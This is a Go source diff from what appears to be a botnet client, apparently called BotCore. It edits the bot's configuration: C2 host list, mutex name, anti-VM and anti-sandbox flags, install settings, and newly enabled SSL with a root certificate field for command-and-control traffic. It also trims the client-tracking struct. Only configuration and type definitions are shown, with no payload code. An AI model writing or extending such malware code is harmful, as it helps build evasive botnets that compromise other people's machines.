@@ -76,7 +76,7 @@ var (
 	pfnGetKeyboardLayout    = user32.NewProc("GetKeyboardLayout")
 
 	botcore = BotCore{
-		version:       "1.5.8",
+		version:       "1.6.8",
 		hosts:         []string{"127.0.0.1:8080"},
 		singleton:     true,
 		sington_mutex: 0,
@@ -84,7 +84,8 @@ var (
 		anti_vm:       false,
 		anti_sandbox:  false,
 		install:       false,
-		use_ssl:       false,
+		use_ssl:       true,
+		root_pem:      "",
 		delay:         0,
 		mutex_name:    "eSq3w0KtD7gDMR7q",
 		install_file:  "",
@@ -118,6 +119,7 @@ type BotCore struct {
 	anti_sandbox  bool
 	install       bool
 	use_ssl       bool
+	root_pem      string
 	delay         uint
 	mutex_name    string
 	install_file  string
@@ -179,8 +181,6 @@ type Client struct {
 	Cpuinfo     string `json:"cpuinfo"`
 	Gpuinfo     string `json:"gpuinfo"`
 	Version     string `json:"version"`
-	Lastseen    string `json:"lastseen"`
-	Lastcommand string `json:"lastcommand"`
 }
 
 type BuildConfig struct {
@@ -195,4 +195,5 @@ type BuildConfig struct {
 	Mutex_name   string   `json:"mutex"`
 	Delay        uint     `json:"delay"`
 	Use_ssl      bool     `json:"ssl"`
+	RootPem      string   `json:"root_pem"`
 }
